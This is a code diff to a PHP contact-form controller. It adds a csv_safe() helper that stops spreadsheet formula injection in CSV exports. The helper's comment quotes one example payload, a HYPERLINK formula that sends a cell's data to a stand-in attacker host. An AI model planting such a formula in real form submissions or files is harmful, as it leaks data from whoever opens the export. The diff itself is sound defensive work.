@@ -185,22 +185,45 @@ final class Submissions_Controller {
 
 		foreach ( $rows as $row ) {
 			fputcsv( $out, [
-				(string) $row['id'],
-				(string) $row['submitted_at'],
-				(string) $row['source_button'],
-				(string) $row['name'],
-				(string) $row['phone'],
-				(string) $row['email'],
-				(string) $row['message'],
-				(string) ( $row['contact_pref'] ?? '' ),
-				(string) $row['page_url'],
-				(string) $row['mail_status'],
-				(string) $row['ip_hash'],
+				self::csv_safe( (string) $row['id'] ),
+				self::csv_safe( (string) $row['submitted_at'] ),
+				self::csv_safe( (string) $row['source_button'] ),
+				self::csv_safe( (string) $row['name'] ),
+				self::csv_safe( (string) $row['phone'] ),
+				self::csv_safe( (string) $row['email'] ),
+				self::csv_safe( (string) $row['message'] ),
+				self::csv_safe( (string) ( $row['contact_pref'] ?? '' ) ),
+				self::csv_safe( (string) $row['page_url'] ),
+				self::csv_safe( (string) $row['mail_status'] ),
+				self::csv_safe( (string) $row['ip_hash'] ),
 			] );
 		}
 
 		fclose( $out );
 		exit;
+	}
+
+	/**
+	 * Defang formula-injection vectors before writing to a CSV cell.
+	 *
+	 * If a cell begins with =, +, -, @, TAB, or CR, Excel / Numbers /
+	 * Google Sheets will interpret it as a formula on open — and an
+	 * attacker who submits a name like
+	 *   =HYPERLINK("https://attacker/?leak="&A1,"Click me")
+	 * gets the row exfiltrated when an admin opens the export.
+	 *
+	 * Prepending a single quote prevents formula evaluation while keeping
+	 * the visible value identical (spreadsheets hide the leading quote).
+	 */
+	private static function csv_safe( string $value ): string {
+		if ( '' === $value ) {
+			return $value;
+		}
+		$first = $value[0];
+		if ( '=' === $first || '+' === $first || '-' === $first || '@' === $first || "\t" === $first || "\r" === $first ) {
+			return "'" . $value;
+		}
+		return $value;
 	}
 
 	public static function export_url( array $filters ): string {
